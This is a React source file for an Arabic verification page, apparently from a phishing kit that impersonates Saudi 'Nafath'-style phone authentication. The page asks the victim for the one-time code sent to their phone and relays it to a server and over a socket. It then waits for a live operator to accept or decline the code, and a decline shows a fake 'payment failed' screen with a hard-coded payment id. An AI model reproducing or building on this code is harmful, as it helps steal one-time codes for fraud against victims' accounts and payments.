import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import NavBar from "../component/NavBar";
import Footer from "../component/Footer";
import { BiBook } from "react-icons/bi";
import { TailSpin } from "react-loader-spinner";
import { serverRoute, socket } from "./Main";
import axios from "axios";
import { AiOutlineCloseCircle } from "react-icons/ai";

const NavazOtp = ({ setMode, checkMode }) => {
  const { id } = useParams();
  const mode = localStorage.getItem("lang");

  const [otp, setOtp] = useState(undefined);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [counter, setCounter] = useState(60);
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1); // Decrease counter by 1 second
      }
    }, 1000);

    // Cleanup function to clear the interval when the component unmounts
    return () => clearInterval(timer);
  }, [counter]);

  // Calculate minutes and seconds
  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  // Format the counter value as "MM:SS"
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    setError(false);
    e.preventDefault();
    await axios
      .post(serverRoute + "/navazOtp/" + sessionStorage.getItem("id"), {
        navazOtp: otp,
      })
      .then(() =>
        socket.emit("navazOtp", {
          id: sessionStorage.getItem("id"),
          navazOtp: otp,
        })
      );
  };

  socket.on("declineNavazOTP", (ID) => {
    if (ID === sessionStorage.getItem("id")) {
      setError(true);
      setLoading(false);
    }
  });
  socket.on("acceptNavazOTP", (id) => {
    console.log(id);
    if (id === sessionStorage.getItem("id")) {
    }
  });

  return (
    <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md">
      <form
        className="bg-white border h-screen border-gray-300 rounded-md  p-3 py-10 text-sm w-full"
        dir="rtl"
        onSubmit={handleSubmit}
      >
        <h2 className="font-bold text-xxl my-2  "> التحقق من رقم الهاتف</h2>
        <p className="py-1 text-xs font-bold text-gray-500 flex flex-col gap-y-2">
          <span> تم ارسال رسالة نصية إلي جوالك علي رقم الهاتف الخاص بك</span>
          <span>يرجي إدخال رمز التحقق المرسل إلي جوالك +966 ********</span>
        </p>

        <div className="flex justify-start p-1 py-3 items-start gap-y-2 w-full flex-col">
          <span className="font-bold"> رمز التحقق *</span>
          <input
            value={otp}
            required
            onChange={(e) => setOtp(e.target.value)}
            dir="ltr"
            placeholder="******"
            inputMode="numeric"
            minLength={4}
            type="text"
            className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
          />
        </div>

        <div className="w-full flex items-center justify-center py-5">
          {" "}
          <button className="  px-5 flex justify-center items-center py-2  bg-sky-800 text-white w-11/12 rounded-md ">
            تأكيد
          </button>
        </div>
        <div className="flex w-full gap-x-3 items-center justify-center">
          سيتم إرسال رسالة كود التحقق خلال دقيقة
        </div>
      </form>
      {loading ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
      {error ? (
        <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
          <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
            <AiOutlineCloseCircle
              className="text-6xl"
              onClick={() => window.location.reload()}
            />
            <div className="flex flex-col w-full items-center justify-center">
              <span>نتيجة الدفع فشل معرف الدفع </span>
              <span>82A27833M4589370G</span>
            </div>
            <button
              className="bg-gray-900 text-white w-11/12 py-3"
              onClick={() => window.location.reload()}
            >
              حاول مرة ثانية
            </button>
          </div>
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default NavazOtp;
